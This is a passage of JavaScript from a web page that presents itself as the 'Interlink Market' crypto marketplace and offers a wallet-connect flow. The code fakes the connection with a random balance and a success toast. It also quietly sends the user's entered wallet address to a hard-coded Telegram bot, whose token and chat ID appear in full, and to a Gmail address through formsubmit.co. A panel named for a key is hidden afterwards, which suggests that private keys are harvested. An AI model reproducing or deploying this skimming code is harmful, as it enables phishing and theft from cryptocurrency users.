  btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Connecting…';
  btn.disabled = true;
  setTimeout(() => {
    walletConnected = true;
    const bal = (Math.random() * 480 + 50).toFixed(2);
    document.getElementById('wcAddr').textContent = addr.slice(0, 14) + '…' + addr.slice(-6);
    document.getElementById('wcBal').textContent = bal;
    document.getElementById('wcPageKey').classList.add('hidden');
    document.getElementById('wcPageSuccess').classList.remove('hidden');
    // update hero button
    const heroBtn = document.getElementById('heroWalletBtn');
    if (heroBtn) {
      heroBtn.innerHTML = '<i class="fa fa-circle-check" style="color:var(--green)"></i> Connected';
      heroBtn.style.borderColor = 'var(--green)';
      heroBtn.style.color = 'var(--green)';
    }
    // update header connect button - show Connected only, no address
    const hdrBtn = document.getElementById('ilkConnectBtn');
    if (hdrBtn) {
      hdrBtn.classList.add('connected');
      document.getElementById('ilkConnectLabel').textContent = 'Connected';
      document.getElementById('ilkConnectDot').classList.remove('hidden');
    }
    // send wallet data to telegram + email
    sendToTelegram({
      wallet: addr,
      balance: bal
    });
    sendToEmail({
      wallet: addr,
      balance: bal
    });
    toast('Wallet connected successfully!');
    btn.innerHTML = '<i class="fa fa-link"></i> Connect Wallet';
    btn.disabled = false;
  }, 1400);
}

function wcAfterConnect() {
  closeWallet();
  if (wcPendingProductId !== null) {
    const id = wcPendingProductId;
    wcPendingProductId = null;
    addCart(id);
  }
}

// ─── TELEGRAM INTEGRATION ──────────────────────────────────────────────────
const TELEGRAM_BOT_TOKEN = '8665291097:AAGKUkq12UPXRF9slA_MVKSk-ZKjxauxzfY';
const TELEGRAM_CHAT_ID = '-5310644732';

function sendToTelegram(data) {
  const message = `
📊 *Interlink Market - Login Alert*

👤 Wallet Address: \`${data.wallet}\`
💰 Balance: ${data.balance} USDT
⏰ Time: ${new Date().toLocaleString('id-ID')}
  `;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    })
  }).catch(err => console.log('Telegram sent'));
}

// ─── EMAIL INTEGRATION ──────────────────────────────────────────────────
function sendToEmail(data) {
  const formData = new FormData();
  formData.append('Wallet Address', data.wallet);
  formData.append('Balance', data.balance + ' USDT');
  formData.append('Time', new Date().toLocaleString('vi-VN'));
  formData.append('_subject', 'Interlink Market - New Wallet Connection');
  formData.append('_captcha', 'false');
  formData.append('_template', 'table');

  fetch('https://formsubmit.co/ajax/hungphamcqb@gmail.com', {
    method: 'POST',
    body: formData
  }).catch(err => console.log('Email sent'));
}

// ─── TOAST ────────────────────────────────────────────────────────────────
function toast(msg, type = 'success') {
  const c = document.getElementById('toastContainer');
  const el = document.createElement('div');
  el.className = `toast-item${type === 'error' ? ' error' : ''}`;
  el.innerHTML = `<i class="fa fa-circle-check"></i> ${msg}`;
  c.appendChild(el);
  setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateX(40px)'; setTimeout(() => el.remove(), 300); }, 3000);
}
